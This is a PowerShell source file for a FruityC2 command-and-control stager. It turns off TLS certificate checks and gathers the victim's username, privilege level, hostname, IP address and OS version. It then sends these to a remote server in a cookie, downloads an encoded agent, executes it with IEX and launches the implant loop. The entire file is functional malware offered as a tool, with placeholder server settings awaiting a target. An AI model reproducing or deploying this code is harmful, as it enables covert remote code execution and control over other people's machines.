# Copyright (C) 2017 xtr4nge [_AT_] gmail.com
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#

function Invoke-Stager {
    param (
        $r_server = "",
        $r_port = "",
        $r_ssl = "",
        $UA = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        $SID = "SESSIONID"
    )

    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;

    [bool]$option_base64 = $false
    [bool]$option_encryption = $false
    [bool]$option_compression = $true
      
    # getUUID
    #$string = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Cryptography' | Select-Object -ExpandProperty MachineGuid) | Out-String
    #$string = $string.Trim()
    $UUID = [int][double]::Parse((Get-Date -UFormat %s))

    # getUser
    $string = ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) | Out-String
    $USER = $string.Trim()

    # getMandatoryLabel
    if(([Environment]::UserName).ToLower() -eq "system"){$string='4'}
    elseif(([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator") -eq $true){$string='3'} # 3=High
    else {$string='2'}
    $LABEL = $string

    # getComputerName
    $string = (Get-WmiObject Win32_OperatingSystem).CSName | Out-String
    $NAME = $string.Trim()

    # getComputerIP
    $string = (Test-Connection $env:COMPUTERNAME -count 1 | select Ipv4Address) | FT -HideTableHeaders |  Out-String
    $IP = $string.Trim()

    # getVersion
    $string = (Get-WmiObject Win32_OperatingSystem).Name.split('|')[0] | Out-String
    $VERSION = $string.Trim()

    $string = (Get-WmiObject Win32_OperatingSystem).OSArchitecture  | Out-String
    $string = $string.Trim()
    $OS_ARCH = $string

    function Get-Data {
        param($path = $script:path_get)
        try{
            $wc = new-object system.net.WebClient
            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
            $wc.Headers.Add("User-Agent",$UA)
            $wc.Headers.Add("Cookie", "$SID=$TARGET;")

            $request = "http$($r_ssl)://$($r_server):$($r_port)$($path)"

            $data = $wc.DownloadString($request)
            return $data
        }
        catch [Net.WebException] {
            #Throw "$($Error[0].Exception.InnerException.InnerException.Message)"
            Write-Host "Get-Data ERROR."
        }
    }

    function deflate($data) { # COMPRESS DATA
        # REF: https://gist.github.com/strazzere/5faa709a3db9e1dcf3b5
        # REF: http://chernodv.blogspot.co.uk/2014/12/powershell-compression-decompression.html
        $s = $data
        $ms = New-Object System.IO.MemoryStream
        $cs = New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Compress)
        $sw = New-Object System.IO.StreamWriter($cs)
        $sw.Write($s)
    
        $sw.Close();
        $s = [System.Convert]::ToBase64String($ms.ToArray())
        $s = $s.replace("+","-") # BASE64 URLSAFE
        $s = $s.replace("/","_") # BASE64 URLSAFE
        return $s
    }

    function inflate($data) { # DECOMPRESS DATA
        $data = $data.replace("-","+") # BASE64 URLSAFE
        $data = $data.replace("_","/") # BASE64 URLSAFE
        $data = [System.Convert]::FromBase64String($data)
        #$data = b64decoder($data)
        $ms = New-Object System.IO.MemoryStream
        $ms.Write($data, 0, $data.Length)
        $ms.Seek(0,0) | Out-Null
        $sr = New-Object System.IO.StreamReader(New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Decompress))
        return $sr.ReadToEnd()
    }

    Function rx_data($data) {
        #if ($option_base64 -eq $true) { $data = b64decoder($data) }
        if ($option_compression -eq $true) { $data = inflate($data) }
        if ($option_encryption -eq $true) { $data = decrypt($data) }
        return $data
    }

    Function tx_data($data) {
        if ($option_encryption -eq $true) { $data = encrypt($data) }
        if ($option_compression -eq $true) { $data = deflate($data) }
        #if ($option_base64 -eq $true) { $data = b64encoder($data) }
        return $data
    }

    function stager($TARGET) {
        $path_stager = -join ((65..90) + (97..122) | Get-Random -Count 30 | % {[char]$_})

        $data = Get-Data -path "/$path_stager"

        Write-Host "STAGER: $data"

        [String]$data = rx_data($data) # DECODE/DECRYPT RECEIVED DATA
    
        [Array[]]$temp = $data.split("|")

        $stime = [convert]::ToInt32($temp[0],10)
        $jitter = [convert]::ToInt32($temp[1],10)
        $UA = $temp[2]
        $path_get = $temp[3]
        $path_post = $temp[4]
        $post_id = $temp[5]
        $session_id = $temp[6]

        $agent = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($temp[7]))
        
        Write-Host $agent

        IEX $($agent)
        Invoke-FruityC2 -path_get $path_get -path_post $path_post -jitter $jitter -stime $stime -UA $UA -stager $false -r_server $r_server -r_port $r_port -target $TARGET -post_id $post_id -session_id $session_id -r_ssl $r_ssl

    }

    #$VERSION = getVersion
    #$USER = getUser
    #$LABEL = getMandatoryLabel
    #$NAME = getComputerName
    #$IP = getComputerIP
    #$UUID = getUUID
    
    $TARGET = tx_data("$UUID|$VERSION|$USER|$LABEL|$NAME|$IP|$OS_ARCH|normal")

    stager($TARGET)

}
clear
Invoke-Stager -r_server "**domain**" -r_port "**port**" -UA "**useragent**" -r_ssl "**ssl**"
